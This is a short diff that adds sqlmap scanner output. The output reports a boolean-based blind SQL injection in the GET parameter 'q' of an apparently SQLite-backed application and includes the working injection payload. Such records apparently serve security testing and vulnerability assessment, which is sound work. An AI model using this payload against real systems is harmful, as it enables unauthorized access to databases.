@@ -1,0 +1,8 @@
+sqlmap identified the following injection point(s) with a total of 146 HTTP(s) requests:
+---
+Parameter: q (GET)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)
+    Payload: q=ScannerXGT') AND CASE WHEN 2542=2542 THEN 2542 ELSE JSON(CHAR(97,122,103,107)) END AND ('vsqy'='vsqy
+---
+back-end DBMS: SQLite
